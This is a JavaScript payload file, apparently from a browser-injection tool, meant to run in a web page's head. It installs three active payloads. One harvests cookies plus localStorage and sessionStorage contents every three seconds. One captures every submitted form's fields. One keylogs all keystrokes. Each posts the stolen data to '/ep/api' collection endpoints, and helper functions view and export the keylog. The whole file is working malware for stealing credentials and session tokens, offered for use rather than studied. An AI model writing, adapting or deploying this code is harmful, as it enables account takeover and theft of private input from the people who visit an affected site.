/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
*/

console.log('%c[✓] Payload initialized', 'color: #4CAF50');

const PayloadManager = {
    // Configuration for payloads
    config: {
        cookieLogger: true,
        formStealer: true,
        keyLogger: true
    },

    // Available payloads
    payloads: {
        cookieLogger: () => {
            const stealCookies = () => {
                // Get all cookies from document
                const documentCookies = document.cookie.split(';').map(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    return { name, value, source: 'document' };
                });

                // Get cookies from localStorage
                const localStorageCookies = Object.keys(localStorage).map(key => {
                    return { name: key, value: localStorage.getItem(key), source: 'localStorage' };
                });

                // Get cookies from sessionStorage
                const sessionStorageCookies = Object.keys(sessionStorage).map(key => {
                    return { name: key, value: sessionStorage.getItem(key), source: 'sessionStorage' };
                });

                const allCookies = [...documentCookies, ...localStorageCookies, ...sessionStorageCookies];

                if (allCookies.length > 0) {
                    fetch('/ep/api/ping', { 
                        method: 'POST',
                        credentials: 'include',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            cookies: allCookies,
                            url: window.location.href,
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            timestamp: new Date().toISOString()
                        })
                    });
                }
            };

            // Initial steal
            stealCookies();

            // Monitor cookie changes
            document.addEventListener('cookie', stealCookies);
            setInterval(stealCookies, 3000);

            // Monitor storage changes
            window.addEventListener('storage', stealCookies);
        },

        formStealer: () => {
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', async (e) => {
                    const formData = new FormData(form);
                    const data = {
                        url: window.location.href,
                        fields: Object.fromEntries(formData),
                        timestamp: new Date().toISOString()
                    };
                    
                    await fetch('/ep/api/forms', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });
                });
            });
        },

        keyLogger: () => {
            let buffer = '';
            let lastKeypressTime = Date.now();
            
            const sendBuffer = () => {
                if (buffer.length > 0) {
                    fetch('/ep/api/keylog', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            keys: buffer,
                            url: window.location.href,
                            timestamp: new Date().toISOString()
                        })
                    });
                    buffer = '';
                }
            };

            document.addEventListener('keydown', (e) => {
                const currentTime = Date.now();
                
                // Add special keys
                if (e.key.length > 1) {
                    buffer += `[${e.key}]`;
                } else {
                    buffer += e.key;
                }
                
                // Send if buffer is full or timeout reached
                if (buffer.length >= 30 || currentTime - lastKeypressTime > 1000) {
                    sendBuffer();
                }
                
                lastKeypressTime = currentTime;
            });

            // Send remaining buffer when tab/window loses focus
            window.addEventListener('blur', sendBuffer);
        }
    },
    
    init: function() {
        document.addEventListener('DOMContentLoaded', () => {
            // Initialize payload states
            Object.keys(this.config).forEach(payload => {
                const status = document.getElementById(`${payload}-status`);
                if (status) {
                    status.textContent = this.config[payload] ? 'Active' : 'Inactive';
                    status.style.color = this.config[payload] ? '#4CAF50' : '#f44336';
                }
                
                if (this.config[payload] && this.payloads[payload]) {
                    try {
                        this.payloads[payload]();
                    } catch (error) {
                        console.error(`Error initializing ${payload}:`, error);
                    }
                }
            });
        });
    },

    togglePayload: function(name) {
        this.config[name] = !this.config[name];
        if (this.config[name]) {
            this.payloads[name]();
        }
        localStorage.setItem('payloadConfig', JSON.stringify(this.config));
    }
};

PayloadManager.init();

function updateKeylogger() {
    fetch('/ep/api/keylog')
        .then(response => response.json())
        .then(logs => {
            const keyloggerList = document.getElementById('keylogger-list');
            keyloggerList.innerHTML = '';
            
            logs.reverse().forEach(log => {
                const entry = document.createElement('div');
                entry.className = 'keylog-entry';
                entry.innerHTML = `
                    <div class="keylog-url">${log.url}</div>
                    <div class="keylog-data">${log.keys}</div>
                    <div class="keylog-time">${new Date(log.timestamp).toLocaleString()}</div>
                `;
                keyloggerList.appendChild(entry);
            });
        });
}

function clearKeylogger() {
    fetch('/ep/api/clearKeylog', { method: 'POST' })
        .then(() => updateKeylogger());
}

function exportKeylogger() {
    fetch('/ep/api/keylog')
        .then(response => response.json())
        .then(logs => {
            const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'keylogger-data.json';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        });
}